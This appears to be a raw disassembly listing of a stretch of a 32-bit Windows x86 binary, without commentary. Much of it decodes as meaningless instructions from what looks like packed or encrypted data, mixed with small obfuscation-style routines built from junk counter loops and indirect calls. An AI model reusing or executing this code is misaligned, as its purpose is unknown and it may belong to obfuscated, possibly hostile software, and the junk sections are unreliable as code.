  4047c7:	prefetchnta BYTE PTR [eax]
  4047ca:	jnp    0x404822
  4047cc:	xor    DWORD PTR [edx-0x6e],esp
  4047cf:	sbb    ch,BYTE PTR [edi-0x1]
  4047d2:	adc    esp,DWORD PTR [eax+esi*8+0xa]
  4047d6:	or     DWORD PTR [ebx+0xc0d7a65],esi
  4047dc:	aad    0x15
  4047de:	rol    BYTE PTR [ebp+ebx*1-0x141b901],1
  4047e5:	pop    edi
  4047e6:	bound  edx,QWORD PTR [edx-0x38]
  4047e9:	stos   BYTE PTR es:[edi],al
  4047ea:	pop    ss
  4047eb:	add    bh,BYTE PTR [ebp-0x2a0e4008]
  4047f1:	mov    edi,0xf7c11505
  4047f6:	das    
  4047f7:	and    ebx,edx
  4047f9:	daa    
  4047fa:	in     eax,0x93
  4047fc:	xlat   BYTE PTR ds:[ebx]
  4047fd:	jmp    0x499b:0xe497af88
  404804:	or     ah,ah
  404806:	je     0x40485a
  404808:	mov    edi,0x67317aad
  40480d:	xchg   DWORD PTR [edx-0x1ad660d8],ebp
  404813:	outs   dx,DWORD PTR ds:[esi]
  404814:	fld    st(6)
  404816:	(bad)  
  404817:	(bad)  
  404818:	push   esi
  404819:	ret    0xbbea
  40481c:	enter  0x3be7,0x4e
  404820:	push   DWORD PTR [eax-0x3]
  404823:	or     DWORD PTR [ebx-0x74583789],ebx
  404829:	xchg   BYTE PTR [edi+0x31],dl
  40482c:	or     esp,DWORD PTR [edx]
  40482e:	pop    es
  40482f:	adc    bh,bh
  404831:	mov    edi,0x61a3cf74
  404837:	ja     0x40482b
  404839:	dec    ebx
  40483a:	psubd  mm3,mm2
  40483d:	xor    DWORD PTR [edi+0x5687f5de],ecx
  404843:	cmc    
  404844:	jae    0x404856
  404846:	mov    ch,0x8b
  404848:	jecxz  0x404848
  40484a:	fcmovbe st,st(2)
  40484c:	cmp    bl,al
  40484e:	int    0xe0
  404850:	shl    DWORD PTR [edx-0x20],1
  404853:	arpl   WORD PTR [edx-0x5f],cx
  404856:	cmp    DWORD PTR [ebp-0x26f29111],ebx
  40485c:	ds mov eax,0x5dfb910f
  404862:	popf   
  404863:	arpl   WORD PTR [ebx-0x3b719ebe],cx
  404869:	lds    esp,FWORD PTR [esi-0x4da988af]
  40486f:	loopne 0x4048a7
  404871:	add    BYTE PTR [esi],dl
  404873:	arpl   WORD PTR [edx+0x5e4be72],dx
  404879:	jns    0x4048e8
  40487b:	addr16 dec esp
  40487d:	fdivrp st(1),st
  40487f:	jl     0x404845
  404881:	(bad)  
  404882:	loopne 0x4048c2
  404884:	cmp    eax,0x7d83ea21
  404889:	test   al,0xa4
  40488b:	loop   0x404816
  40488d:	adc    eax,0xf644c3e
  404892:	mov    bh,0x51
  404894:	cld    
  404895:	dec    eax
  404896:	enter  0x125e,0x6d
  40489a:	sub    BYTE PTR [ebp-0x24],dl
  40489d:	outs   dx,BYTE PTR ds:[esi]
  40489e:	out    dx,eax
  40489f:	xchg   esi,esi
  4048a1:	inc    edi
  4048a2:	imul   esi,DWORD PTR [ecx*1-0x3c83368c],0x6bbffb72
  4048ad:	div    BYTE PTR [edi+0x6c2bbcd4]
  4048b3:	mov    ecx,0x17f83efc
  4048b8:	stc    
  4048b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ba:	push   ds
  4048bb:	loop   0x40484b
  4048bd:	scas   al,BYTE PTR es:[edi]
  4048be:	call   0x744f:0x279b36fc
  4048c5:	into   
  4048c6:	js     0x40485a
  4048c8:	repz cli 
  4048ca:	push   esi
  4048cb:	add    BYTE PTR ds:0xa9bf753e,dh
  4048d1:	pop    esi
  4048d2:	pop    ss
  4048d3:	sbb    al,0x40
  4048d5:	sub    al,0xdf
  4048d7:	mov    bh,dl
  4048d9:	sbb    esi,DWORD PTR [ebx]
  4048db:	mov    ch,0x42
  4048dd:	stc    
  4048de:	rol    ch,1
  4048e0:	jl     0x404896
  4048e2:	inc    ebp
  4048e3:	push   esi
  4048e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e5:	push   0xffffffb7
  4048e7:	sbb    al,BYTE PTR [edx+ebp*8]
  4048ea:	gs inc edx
  4048ec:	or     BYTE PTR [eax+0x179683d4],dl
  4048f2:	add    eax,0x3d976d12
  4048f7:	mov    ah,0x71
  4048f9:	xchg   esi,eax
  4048fa:	push   edx
  4048fb:	repnz sbb BYTE PTR [esi+0x4da6540e],dh
  404902:	inc    edi
  404903:	mov    esp,0x7098a768
  404908:	jmp    0x4048ca
  40490a:	out    dx,eax
  40490b:	jle    0x40492b
  40490d:	xor    DWORD PTR ss:[ebx+0x75e09728],eax
  404914:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  404916:	adc    BYTE PTR [edi-0x78],0x5c
  40491a:	std    
  40491b:	fsub   DWORD PTR [eax+edi*8+0x61]
  40491f:	jo     0x404989
  404921:	fdiv   DWORD PTR [esi+0x40]
  404924:	aas    
  404925:	ret    
  404926:	push   ebp
  404927:	push   eax
  404928:	push   0xffffffec
  40492a:	jle    0x4048fa
  40492c:	push   0x81882c06
  404931:	and    eax,0xf6f103b8
  404936:	push   esi
  404937:	cs shl al,1
  40493a:	scas   al,BYTE PTR es:[edi]
  40493b:	mov    al,ds:0x24a53f1d
  404940:	sahf   
  404941:	neg    BYTE PTR [edx]
  404943:	push   eax
  404944:	out    dx,al
  404945:	push   ebp
  404946:	imul   eax,DWORD PTR [eax+0x3a],0xc346e59
  40494d:	pushf  
  40494e:	mov    edx,0x306b14f9
  404953:	mov    cl,0xfb
  404955:	add    al,0xbd
  404957:	scas   al,BYTE PTR es:[edi]
  404958:	outs   dx,BYTE PTR ds:[esi]
  404959:	or     eax,0xe832db84
  40495e:	int3   
  40495f:	(bad)  
  404960:	outs   dx,DWORD PTR ds:[esi]
  404961:	int3   
  404962:	push   es
  404963:	dec    esp
  404964:	out    0xf4,eax
  404966:	or     eax,0x57c9fe2c
  40496b:	call   0xf61f6025
  404970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404971:	sub    DWORD PTR [eax+0x4b],ebx
  404974:	add    DWORD PTR [ecx+edx*8+0x20],edx
  404978:	in     eax,dx
  404979:	arpl   sp,bx
  40497b:	mov    ?,esp
  40497d:	mov    ds:0x9fa9ff6d,al
  404982:	jle    0x404924
  404984:	into   
  404985:	add    esp,DWORD PTR [ebx+ebp*4+0x12]
  404989:	pop    edx
  40498a:	push   ebx
  40498b:	mov    bh,0x2e
  40498d:	test   eax,0xe50eb725
  404992:	sar    BYTE PTR [eax-0x2c4b1aad],cl
  404998:	ret    0x5dc7
  40499b:	xchg   DWORD PTR [ecx+ebx*1],ebp
  40499e:	push   ebp
  40499f:	(bad)  
  4049a0:	sar    BYTE PTR [ebx-0x2ad9e7ed],1
  4049a6:	cmc    
  4049a7:	mov    edx,0xc7761caf
  4049ac:	sub    eax,0x25f460e6
  4049b1:	clc    
  4049b2:	shl    BYTE PTR [edi-0x5d],0x15
  4049b6:	cdq    
  4049b7:	std    
  4049b8:	add    dl,BYTE PTR [edi+0x0]
  4049bb:	sbb    al,0x22
  4049bd:	idiv   DWORD PTR [esi+0x433dae89]
  4049c3:	cmp    al,BYTE PTR [ebp+0x35d43bdd]
  4049c9:	sub    eax,0xd4937a8e
  4049ce:	retf   
  4049cf:	push   0x3a
  4049d1:	mov    ds:0x8119950a,eax
  4049d6:	xor    al,BYTE PTR [edi]
  4049d8:	pop    es
  4049d9:	inc    ebx
  4049da:	xchg   esp,eax
  4049dc:	inc    esi
  4049dd:	ds jg  0x404968
  4049e0:	stc    
  4049e1:	fisttp DWORD PTR [edx]
  4049e3:	pavgb  mm4,QWORD PTR [ebx+0x79486088]
  4049ea:	js     0x404981
  4049ec:	retf   
  4049ed:	pop    eax
  4049ee:	mov    edx,0xb1760437
  4049f3:	fistp  WORD PTR [edx]
  4049f5:	int    0xf5
  4049f7:	cmp    DWORD PTR [esi-0x71],ebp
  4049fa:	lds    esp,FWORD PTR [ebp-0x7d]
  4049fd:	fisubr DWORD PTR ds:0xe5ade620
  404a03:	popa   
  404a04:	inc    ebp
  404a05:	mov    DWORD PTR [ecx-0xd],edx
  404a08:	fidivr WORD PTR [ecx-0x62be3181]
  404a0e:	dec    eax
  404a0f:	ror    cl,0x31
  404a12:	sar    BYTE PTR [ecx],1
  404a14:	out    dx,eax
  404a15:	or     eax,0xf3bdc00d
  404a1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a1b:	rcl    BYTE PTR [ebx-0x2fecc49b],cl
  404a21:	ins    BYTE PTR es:[edi],dx
  404a22:	mov    WORD PTR [ecx+0x41],cs
  404a25:	adc    BYTE PTR [ecx-0x7097d2d3],cl
  404a2b:	not    bh
  404a2d:	xor    ch,BYTE PTR [edi]
  404a2f:	in     al,dx
  404a30:	mov    eax,ds:0xec10698b
  404a35:	loope  0x404a68
  404a37:	stc    
  404a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a39:	inc    edx
  404a3a:	cdq    
  404a3b:	retf   
  404a3c:	xchg   ecx,eax
  404a3d:	push   edx
  404a3e:	rcl    DWORD PTR [edi-0x428bfbd0],cl
  404a44:	push   es
  404a45:	in     al,0x3
  404a47:	scas   eax,DWORD PTR es:[edi]
  404a48:	in     eax,0xe3
  404a4a:	xchg   BYTE PTR [edx+ebx*1-0xd],ah
  404a4e:	sub    bh,BYTE PTR [eax-0x33b93dc6]
  404a54:	mov    cl,0x33
  404a56:	inc    esi
  404a57:	xchg   esp,eax
  404a58:	add    bl,dl
  404a5a:	test   eax,0x820738ac
  404a5f:	(bad)  
  404a60:	fistp  DWORD PTR [eax-0x43828e29]
  404a66:	adc    bh,dl
  404a68:	(bad)  
  404a69:	xchg   ebp,eax
  404a6a:	xchg   ebp,eax
  404a6b:	mov    WORD PTR [ebx],gs
  404a6d:	cs inc eax
  404a6f:	pop    edi
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43373f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4336b7
  404a94:	and    DWORD PTR ds:0x433703,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43362b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43366b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43372b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4336c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4336c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4336c3,edi
  404adf:	cmp    DWORD PTR ds:0x4336c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4336c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4336c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4336c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4336c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x76c15329]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	or     eax,DWORD PTR [eax]
  404b3b:	mov    DWORD PTR [esp+esi*8],ebp
  404b3e:	popf   
  404b3f:	sbb    edi,DWORD PTR [esi]
  404b41:	pop    es
  404b42:	pop    esp
  404b43:	mov    gs,WORD PTR [ecx+edi*4]
  404b46:	or     ah,0x85
  404b49:	or     dh,BYTE PTR [ecx-0x15]
  404b4c:	jle    0x404ba0
  404b4e:	mov    al,ds:0x5e58fcf9
  404b53:	ins    DWORD PTR es:[edi],dx
  404b54:	iret   
  404b55:	enter  0x76a3,0x46
  404b59:	aam    0xbf
  404b5b:	(bad)  
  404b5c:	adc    DWORD PTR [edi+0x34],ebx
  404b5f:	xchg   edx,eax
  404b60:	aam    0x58
  404b62:	or     ah,BYTE PTR [edx-0x1f14498a]
  404b68:	leave  
  404b69:	cli    
  404b6a:	jb     0x404bd9
  404b6c:	jo     0x404bd6
  404b6e:	and    al,0x96
  404b70:	addr16 (bad) 
  404b73:	mov    bl,0xcb
  404b75:	xchg   esp,eax
  404b76:	jle    0x404bba
  404b78:	add    ebp,edx
  404b7a:	mov    dh,0xfe
  404b7c:	cdq    
  404b7d:	test   eax,0x439a8b9f
  404b82:	sbb    edx,DWORD PTR [eax+0x59]
  404b85:	popf   
  404b86:	loope  0x404ba7
  404b88:	out    0xdb,al
  404b8a:	stos   BYTE PTR es:[edi],al
  404b8b:	fcomp  DWORD PTR [esi-0x49fe1b56]
  404b91:	stc    
  404b92:	mov    eax,DWORD PTR [ecx-0x51e29829]
  404b98:	xsha256 (bad)
  404b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b9a:	xlat   BYTE PTR ds:[ebx]
  404b9b:	add    DWORD PTR [edi+0x2f],eax
  404b9e:	into   
  404b9f:	jns    0x404c1e
  404ba1:	call   0x81ce1b4c
  404ba6:	dec    ebx
  404ba7:	out    dx,al
  404ba8:	mov    bh,0x6f
  404baa:	test   al,al
  404bac:	jl     0x404c12
  404bae:	mov    ecx,0xc443bf76
  404bb3:	stos   DWORD PTR es:[edi],eax
  404bb4:	sbb    eax,0xf19034c7
  404bb9:	out    0x38,al
  404bbb:	mov    bh,0xf7
  404bbd:	add    ebp,DWORD PTR [ecx]
  404bbf:	lahf   
  404bc0:	add    BYTE PTR [ebx-0x3a18b795],0x89
  404bc7:	dec    ebp
  404bc8:	bound  ebp,QWORD PTR [eax]
  404bca:	inc    edx
  404bcb:	push   cs
  404bcc:	add    bh,BYTE PTR [eax]
  404bce:	popf   
  404bcf:	shl    BYTE PTR [edi+0x35],0xae
  404bd3:	out    dx,eax
  404bd4:	aad    0xaf
  404bd6:	cs gs and al,0xfa
  404bda:	dec    esp
  404bdb:	aaa    
  404bdc:	rcr    BYTE PTR [esi+0x50],cl
  404bdf:	dec    ecx
  404be0:	mov    eax,0xcb7a4b3d
  404be5:	sbb    BYTE PTR [ebx-0x4e],ah
  404be8:	out    dx,al
  404be9:	push   ebp
  404bea:	xor    eax,0x5705d08b
  404bef:	loopne 0x404c53
  404bf1:	or     esi,DWORD PTR [ecx+0x3a]
  404bf4:	xor    ebx,esi
  404bf6:	ss aam 0xec
  404bf9:	(bad)  
  404bfa:	in     al,0x61
  404bfc:	mov    DWORD PTR [edx],esp
  404bfe:	jmp    0x404c46
  404c00:	add    al,0x14
  404c02:	mov    ecx,0x82132221
  404c07:	lea    ebx,[edx-0x1ee4e976]
  404c0d:	xchg   BYTE PTR [esi+esi*8],bl
  404c10:	clc    
  404c11:	xchg   esi,eax
  404c12:	popf   
  404c13:	test   DWORD PTR [edx],edx
  404c15:	leave  
  404c16:	sbb    eax,0xae1ad8c6
  404c1b:	jns    0x404bdf
  404c1d:	fisttp DWORD PTR [eax]
  404c1f:	dec    ebx
  404c20:	sub    eax,0x1a862ed1
  404c25:	xchg   edx,eax
  404c26:	ja     0x404c7a
  404c28:	cmp    eax,0x4935beee
  404c2d:	int    0x5b
  404c2f:	mov    eax,esi
  404c31:	je     0x404bf5
  404c33:	lea    edi,[edx+0x1ef54138]
  404c39:	sbb    BYTE PTR [eax+0x71],al
  404c3c:	mov    eax,ds:0x91317ffc
  404c41:	frndint 
  404c43:	loope  0x404c2c
  404c45:	es xor eax,0x603ec1b3
  404c4b:	push   0xdf2ea34
  404c50:	ds push cs
  404c52:	dec    ebx
  404c53:	and    eax,esp
  404c55:	add    ecx,edi
  404c57:	(bad)  
  404c58:	xchg   esi,eax
  404c59:	mov    edx,es
  404c5b:	bound  ebx,QWORD PTR [esp+ecx*8]
  404c5e:	add    eax,0xe40cda8d
  404c63:	sahf   
  404c64:	mov    esp,0x43213bea
  404c69:	xchg   ecx,eax
  404c6a:	jne    0x404c9a
  404c6c:	rcl    dl,cl
  404c6e:	or     BYTE PTR [eax-0x526a7e69],dh
  404c74:	xor    al,0x8f
  404c76:	pop    ebp
  404c77:	stos   DWORD PTR es:[edi],eax
  404c78:	scas   eax,DWORD PTR es:[edi]
  404c79:	enter  0x3277,0x34
  404c7d:	loope  0x404cd8
  404c7f:	pop    edx
  404c80:	imul   esi,DWORD PTR [edi],0xfffffffe
  404c83:	fisub  DWORD PTR [esi]
  404c85:	jae    0x404cf6
  404c87:	or     esp,ebp
  404c89:	stos   DWORD PTR es:[edi],eax
  404c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c8b:	call   0xc14ab875
  404c90:	inc    edx
  404c91:	push   ds
  404c92:	dec    edi
  404c93:	push   0xfffffff4
  404c95:	cmp    al,0x27
  404c97:	xchg   ebp,eax
  404c98:	fwait
  404c99:	shl    DWORD PTR [edi-0x58c71b8e],cl
  404c9f:	ins    DWORD PTR es:[edi],dx
  404ca0:	dec    edx
  404ca1:	cmp    eax,DWORD PTR [eax-0x79081462]
  404ca7:	imul   DWORD PTR [ecx+0x42]
  404caa:	dec    edi
  404cab:	cmp    ebp,edx
  404cad:	cmp    BYTE PTR [esi-0x79],dl
  404cb0:	dec    esi
  404cb1:	and    eax,0xac502415
  404cb6:	adc    al,0x18
  404cb8:	ds jae 0x404c40
  404cbb:	and    al,0x48
  404cbd:	imul   esi,ebp,0x90ded21c
  404cc3:	mov    al,ds:0x76449f3a
  404cc8:	xor    ah,BYTE PTR [edi]
  404cca:	ins    DWORD PTR es:[edi],dx
  404ccb:	repnz cmp dl,al
  404cce:	data16 sub BYTE PTR fs:[ebx-0x610f92dc],ch
  404cd6:	int3   
  404cd7:	sbb    DWORD PTR [esi+0x2b],0xfffffff0
  404cdb:	adc    esp,DWORD PTR [esi]
  404cdd:	(bad)  [ebp-0x23aed68d]
  404ce3:	fsubr  st,st(5)
  404ce5:	add    al,BYTE PTR [ebx+0x1063f63c]
  404ceb:	scas   eax,DWORD PTR es:[edi]
  404cec:	clc    
  404ced:	mov    ecx,0xaed33422
  404cf2:	test   dh,al
  404cf4:	cdq    
  404cf5:	push   edx
  404cf6:	jle    0x404c90
  404cf8:	sub    dh,BYTE PTR [ecx+0x4c]
  404cfb:	mov    esi,eax
  404cfd:	jb     0x404cd4
  404cff:	js     0x404d51
  404d01:	xchg   esp,eax
  404d02:	push   es
  404d03:	xchg   edx,eax
  404d04:	adc    BYTE PTR [eax],0x52
  404d07:	jmp    0x404cec
  404d09:	push   ds
  404d0a:	sbb    DWORD PTR [edi-0x70],ecx
  404d0d:	in     eax,dx
  404d0e:	gs add al,0xa9
  404d11:	mov    edx,0x2a9b3523
  404d16:	mov    esp,0xb4f3f2f0
  404d1b:	ins    BYTE PTR es:[edi],dx
  404d1c:	dec    edx
  404d1d:	pop    edx
  404d1e:	push   edx
  404d1f:	aam    0x80
  404d21:	cs scas al,BYTE PTR es:[edi]
  404d23:	retf   0xf518
  404d26:	fild   QWORD PTR [eax+ebx*2+0x11313a44]
  404d2d:	xchg   ebx,eax
  404d2e:	pop    edi
  404d2f:	or     ebx,esi
  404d31:	dec    edx
  404d32:	sub    BYTE PTR ds:0x18a5064d,ch
  404d38:	pop    ebx
  404d39:	ror    DWORD PTR [eiz*4-0x6f5d282c],1
  404d40:	sti    
  404d41:	mov    bh,0x24
  404d43:	call   0x8974:0xe92b3c0b
  404d4a:	das    
  404d4b:	push   cs
  404d4c:	int    0x33
  404d4e:	outs   dx,BYTE PTR ds:[esi]
  404d4f:	xchg   edx,eax
  404d50:	inc    esi
  404d51:	mov    edx,0x8fe36f73
  404d56:	mov    ebp,0xfa425ef0
  404d5b:	sbb    eax,0xcddce710
  404d60:	fbld   TBYTE PTR [ebx+0x6e]
  404d63:	repnz push ecx
  404d65:	push   ds
  404d66:	jno    0x404d6d
  404d68:	mov    ch,0xd2
  404d6a:	leave  
  404d6b:	push   ebp
  404d6c:	sar    bl,cl
  404d6e:	push   edx
  404d6f:	push   cs
  404d70:	or     BYTE PTR [esi],0xb1
  404d73:	inc    eax
  404d74:	outs   dx,DWORD PTR ds:[esi]
  404d75:	test   DWORD PTR [edx],0xa1f9e2b0
  404d7b:	add    BYTE PTR [ecx+0x67],dh
  404d7e:	jl     0x404df9
  404d80:	adc    al,0x1f
  404d82:	das    
  404d83:	repz (bad) 
  404d85:	stos   DWORD PTR es:[edi],eax
  404d86:	and    ax,0x62a9
  404d8a:	pop    eax
  404d8b:	pop    ss
  404d8c:	adc    eax,0xe4cd58c1
  404d91:	mov    al,ds:0x1bb62833
  404d96:	imul   ebx,eax,0x15f157ea
  404d9c:	cs jge 0x404e07
  404d9f:	jae    0x404e0e
  404da1:	fld    DWORD PTR [edi-0x2ecd5524]
  404da7:	ficomp DWORD PTR [edx]
  404da9:	push   ss
  404daa:	mov    bh,0x59
  404dac:	inc    edi
  404dad:	sbb    DWORD PTR [eax],0x16
  404db0:	cmp    esp,ebx
  404db2:	sub    ebx,ecx
  404db4:	sar    DWORD PTR [ebx],1
  404db6:	jecxz  0x404e05
  404db8:	sar    esi,1
  404dba:	aam    0xa
  404dbc:	dec    esi
  404dbd:	ret    
  404dbe:	push   ds
  404dbf:	scas   eax,DWORD PTR es:[edi]
  404dc0:	(bad)  
  404dc2:	mov    ebp,esi
  404dc4:	iret   
  404dc5:	push   ds
  404dc6:	icebp  
  404dc7:	stc    
  404dc8:	out    0xd1,eax
  404dca:	cmc    
  404dcb:	sbb    DWORD PTR [ebp-0x28],0x1d
  404dcf:	fwait
  404dd0:	cmp    esi,esi
  404dd2:	stos   BYTE PTR es:[edi],al
  404dd3:	pop    ss
  404dd4:	cwde   
  404dd5:	out    dx,al
  404dd6:	daa    
  404dd7:	repnz mov ds:0x27db431a,al
  404ddd:	push   esp
  404dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ddf:	jecxz  0x404e3a
  404de1:	pop    edx
  404de2:	stc    
  404de3:	fxch   st(2)
  404de5:	in     eax,0xe9
  404de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de8:	repz (bad) 
  404dea:	jns    0x404dce
  404dec:	pop    ebx
  404ded:	int3   
  404dee:	jo     0x404e18
  404df0:	in     eax,dx
  404df1:	push   ds
  404df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df3:	(bad)  
  404df4:	das    
  404df5:	fstp   DWORD PTR gs:[ecx]
  404df8:	cwde   
  404df9:	xor    al,0x5d
  404dfb:	in     eax,0x80
  404dfd:	mov    bl,0x9f
  404dff:	icebp  
  404e00:	mov    esi,eax
  404e02:	sub    ah,BYTE PTR [ebx+eiz*2-0x2d]
  404e06:	xor    al,0xcf
  404e08:	xchg   BYTE PTR [eax-0x1b],al
  404e0b:	repnz or BYTE PTR [eax],dh
  404e0e:	in     eax,0xb
  404e10:	pop    esi
  404e11:	js     0x404e5a
  404e13:	pop    esp
  404e14:	in     al,dx
  404e15:	push   es
  404e16:	xor    BYTE PTR ds:0x580a97da,bl
  404e1c:	mov    bh,0x84
  404e1e:	out    0xea,al
  404e20:	mov    WORD PTR [ebx+ebp*2],cs
  404e23:	adc    al,cl
  404e25:	sub    al,0xff
  404e27:	jns    0x404e33
  404e29:	or     DWORD PTR [ebp-0x6408bd45],0x573e2aee
  404e33:	or     eax,0xdf485f3b
  404e38:	jns    0x404dd2
  404e3a:	out    dx,al
  404e3b:	or     DWORD PTR [ebx*1+0x45605c54],0xffffffa7
  404e43:	in     al,dx
  404e44:	xchg   ebx,eax
  404e45:	(bad)  
  404e48:	adc    esp,edi
  404e4a:	shl    BYTE PTR [edi+0x3d6649ca],1
  404e50:	shl    BYTE PTR [eax+0x6c],cl
  404e53:	jbe    0x404e08
  404e55:	shr    BYTE PTR [eax+0x984e8d8],cl
  404e5b:	shl    BYTE PTR [ecx+0x70],0xc7
  404e5f:	and    bh,BYTE PTR [edi+edi*8+0x0]
  404e63:	push   ds
  404e64:	adc    esi,DWORD PTR [esi+0x75]
  404e67:	push   eax
  404e68:	pop    es
  404e69:	jne    0x404e33
  404e6b:	and    eax,0xc64aa974
  404e70:	lea    edx,[edi]
  404e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e73:	adc    al,0x93
  404e75:	push   ds
  404e76:	mov    edx,DWORD PTR [ebp+0x8]
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43361b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4336e7
  404e9e:	adc    DWORD PTR ds:0x43367f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4336eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4336eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4336eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4336eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4336eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4336eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4336eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4336eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43373f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4336eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4336bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43373b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43373b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43373b,edi
  404f40:	cmp    DWORD PTR ds:0x43373b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43373b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43373b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43373b,edi
  404f72:	cmp    DWORD PTR ds:0x43373b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433637,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433667,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4336ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43360f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433667
  404fc8:	and    DWORD PTR ds:0x433613,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4336e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43372f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433737,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4336ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433627,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433627
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433627,edi
  405039:	cmp    DWORD PTR ds:0x433627,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433627,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433627
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433627,edi
  405079:	cmp    DWORD PTR ds:0x433627,0x17
  405080:	jb     0x40502c
